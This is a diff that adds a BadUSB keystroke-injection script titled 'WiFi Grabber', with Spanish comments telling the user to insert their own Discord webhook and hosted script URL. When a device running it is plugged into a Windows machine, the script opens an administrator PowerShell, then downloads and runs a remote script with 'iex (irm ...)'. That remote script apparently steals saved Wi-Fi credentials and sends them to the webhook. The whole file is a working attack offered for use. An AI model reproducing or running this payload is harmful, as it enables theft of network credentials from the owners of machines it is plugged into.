@@ -1,0 +1,22 @@
+REM WiFi Grabber
+REM === INSTRUCCIONES ===
+REM 1. Reemplaza "https://tusitio.com/wifi.ps1" por la URL RAW de tu script alojado (GitHub, Pastebin, etc.)
+REM 2. Reemplaza "https://discord.com/api/webhooks/TU_WEBHOOK" por tu propio webhook de Discord
+REM 3. Opcional: ajusta los DELAY si el equipo es lento
+REM =====================
+
+DELAY 2000
+WINDOWS x
+DELAY 1500
+STRING a
+DELAY 1500
+LEFTARROW
+DELAY 1500
+ENTER
+DELAY 1500
+
+STRING $dc='https://discord.com/api/webhooks/TU_WEBHOOK'; iex (irm https://raw.githubusercontent.com/manuelnoyav/BadUSB_SCRIPTS/refs/heads/main/BadUSB_WIFI_Grabber/main.ps1)
+ENTER
+DELAY 2000
+STRING exit
+ENTER
